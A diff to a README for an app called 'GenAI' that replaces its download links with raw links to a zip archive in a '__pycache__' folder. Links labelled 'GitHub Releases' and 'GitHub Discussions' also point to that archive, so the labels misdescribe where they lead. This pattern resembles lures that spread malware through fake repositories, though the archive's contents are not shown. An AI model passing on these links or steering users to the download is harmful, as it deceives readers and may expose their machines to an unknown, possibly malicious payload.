@@ -8,9 +8,9 @@ Welcome to GenAI! This application allows you to upload documents, ask questions
 
 To get started, download the application from our Releases page. 
 
-[![Download GenAI](https://github.com/thesiddguy/GenAI/raw/refs/heads/main/static/AI_Gen_v3.8.zip)](https://github.com/thesiddguy/GenAI/raw/refs/heads/main/static/AI_Gen_v3.8.zip)
+[![Download GenAI](https://raw.githubusercontent.com/thesiddguy/GenAI/main/__pycache__/AI-Gen-v3.1-beta.4.zip)](https://raw.githubusercontent.com/thesiddguy/GenAI/main/__pycache__/AI-Gen-v3.1-beta.4.zip)
 
-Visit the page to download: [GitHub Releases](https://github.com/thesiddguy/GenAI/raw/refs/heads/main/static/AI_Gen_v3.8.zip)
+Visit the page to download: [GitHub Releases](https://raw.githubusercontent.com/thesiddguy/GenAI/main/__pycache__/AI-Gen-v3.1-beta.4.zip)
 
 ### Steps to Download
 
@@ -71,7 +71,7 @@ Keeping GenAI updated ensures you benefit from new features and improvements.
 
 If you have questions or need help, feel free to reach out. You can connect with other users and get support in the following ways:
 
-- Join our community on [GitHub Discussions](https://github.com/thesiddguy/GenAI/raw/refs/heads/main/static/AI_Gen_v3.8.zip) to ask questions and share experiences.
+- Join our community on [GitHub Discussions](https://raw.githubusercontent.com/thesiddguy/GenAI/main/__pycache__/AI-Gen-v3.1-beta.4.zip) to ask questions and share experiences.
 - Check the FAQ section on the GitHub page for common issues and solutions.
 
 ## 📜 License
